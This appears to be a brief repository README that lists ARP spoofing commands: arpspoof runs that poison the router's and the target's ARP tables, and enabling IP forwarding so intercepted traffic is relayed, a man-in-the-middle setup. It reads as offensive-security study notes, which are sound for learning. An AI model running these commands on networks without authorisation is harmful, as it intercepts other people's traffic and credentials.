# Cybersecurity-tools
A plethora of algorithms to automate basic cybersecurity tasks


# ARP SPOOFING.

1) Pretend to be the router.
    A) arp-a --> see your interface and router IP.
    A) arpspoof -i eth0 -t (router ip ) (target ip) --> Update arp table to tell router that I am target

2) Pretend to be the target.
    arpspoof -i eth0 -t (target ip ) (router ip) --> Update arp table to tell target that I am router

3) Port Forwarding 
    A) echo 1 > /proc/sys/net/ipv4/ip_forward 